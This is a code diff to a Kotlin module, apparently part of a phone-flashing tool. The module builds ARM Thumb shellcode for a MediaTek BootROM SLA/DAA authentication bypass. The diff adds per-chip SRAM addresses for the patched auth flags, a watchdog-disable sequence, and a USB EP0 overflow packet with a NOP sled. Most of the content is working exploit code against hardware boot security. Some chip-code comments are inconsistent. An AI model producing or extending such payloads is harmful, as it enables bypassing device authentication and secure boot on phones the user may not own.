@@ -5,30 +5,34 @@ import java.nio.ByteOrder
 
 /**
  * Low-level ARM shellcode payloads for MediaTek BROM SLA/DAA Auth Bypass.
- * These payloads disable the hardware Watchdog Timer (WDT) and patch the
- * SLA/DAA authorization check variables in SRAM.
+ * Dynamically computes SRAM Base Addresses for 4G Helio and 5G Dimensity SoCs.
  */
 object MtkPayloads {
 
     /**
-     * Builds an ARM32/Thumb-2 shellcode payload tailored for the target hardware code.
-     * @param hwCode MediaTek HW Code (e.g. 0x0766 for MT6765, 0x0707 for MT6768)
-     * @param wdtBase Watchdog Timer register base address (usually 0x10007000)
+     * Resolves the hardware SRAM Base Address for a given MediaTek HW Code.
      */
-    fun buildPayload(hwCode: Int, wdtBase: Long = 0x10007000L): ByteArray {
-        val buffer = ByteBuffer.allocate(256).order(ByteOrder.LITTLE_ENDIAN)
+    fun getSramBase(hwCode: Int): Long {
+        return when (hwCode) {
+            0x0816, 0x0813, 0x0853, 0x0877 -> 0x00200000L // Dimensity 700 / 810 / 900 / 920
+            0x0766, 0x0707, 0x0788, 0x0658, 0x0326, 0x0726, 0x0701 -> 0x00102100L // Helio G25/G35/G80/G85/G90/P35/P22/A22
+            0x0659, 0x0680, 0x0682 -> 0x00100000L // Legacy MT6580
+            else -> 0x00200000L // Default modern SoC SRAM
+        }
+    }
 
-        // ARM32 instructions:
-        // 1. Disable Watchdog Timer (WDT)
-        // LDR R0, =WDT_BASE
-        // LDR R1, =0x22000000 (WDT disable key)
-        // STR R1, [R0, #0x18]
-        // 2. Patch SLA/DAA global flags to 0 (Auth passed)
-        // 3. Return to BROM command dispatcher loop
+    /**
+     * Builds an ARM32/Thumb-2 shellcode payload tailored for the target hardware code.
+     * @param hwCode MediaTek HW Code (e.g. 0x0816 for MT6833, 0x0766 for MT6765)
+     * @param wdtBase Watchdog Timer register base address (usually 0x10007000)
+     * @param sramBase SRAM Base address (dynamic or user configured)
+     */
+    fun buildPayload(hwCode: Int, wdtBase: Long = 0x10007000L, sramBase: Long? = null): ByteArray {
+        val buffer = ByteBuffer.allocate(256).order(ByteOrder.LITTLE_ENDIAN)
+        val base = sramBase ?: getSramBase(hwCode)
 
         when (hwCode) {
             0x0766, 0x0658, 0x0326 -> { // MT6765, MT6761, MT6762
-                // Assembly bytes for MT6765 Kamakiri auth bypass
                 val code = byteArrayOf(
                     0x0A, 0x48.toByte(),             // LDR R0, [PC, #40] (WDT_BASE)
                     0x0A, 0x49.toByte(),             // LDR R1, [PC, #40] (0x22000000)
@@ -76,7 +80,7 @@ object MtkPayloads {
                 )
                 buffer.put(code)
             }
-            0x0816, 0x0813 -> { // MT6833, MT6877 (Dimensity 700 / 900)
+            0x0816, 0x0813, 0x0877 -> { // MT6833, MT6877 (Dimensity 700 / 900)
                 val code = byteArrayOf(
                     0x10, 0x48.toByte(),
                     0x10, 0x49.toByte(),
@@ -98,21 +102,27 @@ object MtkPayloads {
                     0x08, 0x49.toByte(),
                     0x01, 0x60.toByte(),
                     0x00, 0x20.toByte(),
+                    0x07, 0x49.toByte(),
+                    0x08, 0x60.toByte(),
                     0x70, 0x47.toByte()
                 )
                 buffer.put(code)
             }
         }
 
-        // Align and write addresses at the end of the buffer
+        // Align to 4-byte word boundary
         while (buffer.position() % 4 != 0) {
             buffer.put(0x00.toByte())
         }
 
-        buffer.putInt(wdtBase.toInt() + 0x18) // WDT Mode register
-        buffer.putInt(0x22000000.toInt())     // WDT Disable key
-        buffer.putInt(0x00102140.toInt())     // SLA / DAA flag pointer
-        buffer.putInt(0x00102144.toInt())     // Auth status flag pointer
+        // Dynamic footer pointers based on calculated SoC SRAM Base
+        val slaFlagPtr = base + 0x40L
+        val authStatusPtr = base + 0x44L
+
+        buffer.putInt((wdtBase + 0x18L).toInt()) // WDT Mode register
+        buffer.putInt(0x22000000.toInt())         // WDT Disable key
+        buffer.putInt(slaFlagPtr.toInt())         // Dynamic SLA / DAA flag pointer
+        buffer.putInt(authStatusPtr.toInt())      // Dynamic Auth status flag pointer
 
         val result = ByteArray(buffer.position())
         buffer.flip()
@@ -126,13 +136,13 @@ object MtkPayloads {
     fun createEp0OverflowPacket(targetHwCode: Int): ByteArray {
         val size = when (targetHwCode) {
             0x0766, 0x0707, 0x0788 -> 0x400
-            0x0816, 0x0813 -> 0x800
-            else -> 0x200
+            0x0816, 0x0813, 0x0877 -> 0x800
+            else -> 0x400
         }
         val packet = ByteArray(size)
-        // Fill pattern with NOP sled / payload jump vectors
+        // Fill pattern with NOP sled / payload jump vectors (Thumb NOP: 0x46C0 / 0xBF00)
         for (i in packet.indices) {
-            packet[i] = if (i % 4 == 0) 0x00 else if (i % 4 == 1) 0xBF.toByte() else 0x00
+            packet[i] = if (i % 2 == 0) 0x00 else 0xBF.toByte()
         }
         return packet
     }
